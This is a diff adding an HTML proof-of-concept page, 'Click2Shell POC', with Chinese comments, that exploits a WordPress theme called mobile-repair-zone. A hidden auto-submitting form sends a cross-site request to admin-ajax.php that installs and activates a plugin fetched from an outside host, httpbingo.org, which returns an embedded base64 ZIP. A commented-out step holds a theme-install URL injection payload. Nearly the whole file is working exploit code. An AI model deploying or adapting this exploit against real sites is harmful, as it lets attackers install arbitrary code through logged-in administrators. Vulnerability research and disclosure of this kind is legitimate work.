@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <title>Click2Shell POC (Fixed)</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #status { margin-top: 20px; color: red; }
+    </style>
+</head>
+<body>
+    <h1>Click2Shell POC</h1>
+    <button onclick="triggerExploit()">Trigger Vulnerability</button>
+    <div id="status"></div>
+
+    <form id="stage-two" method="post" target="victim" style="display:none;">
+        <input name="action" value="mobile_repair_zone_install_and_activate_plugin">
+        <input name="plugin_details[plugin_text_domain]" value="mrz-marker">
+        <input name="plugin_details[plugin_main_file]" value="mrz-marker.php">
+        <input id="plugin-url" name="plugin_details[plugin_url]" value="">
+    </form>
+    <iframe name="victim" style="display:none;"></iframe>
+
+    <script>
+	    const currentIP = window.location.hostname;
+        const TARGET = 'http://<IP>:8080';
+        const THEME = 'mobile-repair-zone';
+
+        // 替換為新的 Base64 字串（包含 mrz-marker/mrz-marker.php）
+        const ZIP_BASE64 = 'UEsDBAoAAAAAAI6TTF0AAAAAAAAAAAAAAAALABwAbXJ6LW1hcmtlci9VVAkAA8wmzWrbJs1qdXgLAAEE6AMAAAToAwAAUEsDBBQAAAAIAI6TTF1ZizbDrgAAANoAAAAZABwAbXJ6LW1hcmtlci9tcnotbWFya2VyLnBocFVUCQADzCbNatImzWp1eAsAAQToAwAABOgDAABljEsLgkAUhff3V1xE8LHQ2poVYdKqBxEtihAZb83Q6MjMCFH03zNp19md73ycdN7yFuIQdrK7iQY3ZU0JrvcnXJf6ThqWZJgWrRWqSXCf5bjbZnAkbQYwjkaw6CxXOsEDGQthDCCu6AtjyPpuscoPZ6/Wz4LVlXcJAnwB9nH7ilPstKyIqYr+zcngEeMKnbTVNHMwQsNJyoIexPzvQ9AjJ42H9ec/hJ3AG+Yz+ABQSwECHgMKAAAAAACOk0xdAAAAAAAAAAAAAAAACwAYAAAAAAAAABAA/UEAAAAAbXJ6LW1hcmtlci9VVAUAA8wmzWp1eAsAAQToAwAABOgDAABQSwECHgMUAAAACACOk0xdWYs2w64AAADaAAAAGQAYAAAAAAABAAAAtIFFAAAAbXJ6LW1hcmtlci9tcnotbWFya2VyLnBocFVUBQADzCbNanV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAgACALAAAABGAQAAAAA=';
+
+        function triggerExploit() {
+            document.getElementById('status').textContent = '正在觸發漏洞...';
+
+            // 步驟 1：自動安裝主題
+            //document.getElementById('status').textContent = '正在安裝主題...';
+            //const themeWindow = window.open(
+                //TARGET + '/wp-admin/theme-install.php?theme=mobile-repair-zone%22%5D%3E%2A%3E%2A%3E%2A%2F%2A',
+				// https://wordpress.example/wp-admin/theme-install.php?theme=twentytwenty%22%5D%3E%2A%3E%2A%3E%2A%2F%2A
+                //'_blank',
+                //'width=1,height=1'
+            //);
+
+            // 等待 10 秒後自動安裝外掛
+            setTimeout(() => {
+                //if (themeWindow) themeWindow.close();
+
+                // 步驟 2：送出外掛安裝請求
+                document.getElementById('status').textContent = '正在安裝外掛...';
+                document.querySelector('#plugin-url').value =
+                    'https://httpbingo.org/base64/' + encodeURIComponent(ZIP_BASE64);
+                document.querySelector('#stage-two').action =
+                    TARGET + '/wp-admin/admin-ajax.php?wp_customize=on&customize_theme=' + THEME;
+                document.querySelector('#stage-two').submit();
+
+                // 步驟 3：檢查外掛是否安裝成功
+                setTimeout(() => {
+                    fetch(TARGET + '/wp-content/plugins/mrz-marker/mrz-marker.php', {
+                        mode: 'no-cors'
+						})
+					.then(() => {
+					    // 伺服器有回應即代表可達（外掛目錄存在或端點已回應）
+						document.getElementById('status').textContent =
+						    '觸發成功！目標外掛端點可達：' + TARGET + '/wp-content/plugins/mrz-marker/mrz-marker.php';
+					})
+					.catch((err) => {
+					    document.getElementById('status').textContent =
+						    '無法連接到目標端點，請檢查網路或容器狀態。';
+					});
+				}, 2000);
+            }, 10000);
+        }
+    </script>
+</body>
+</html>
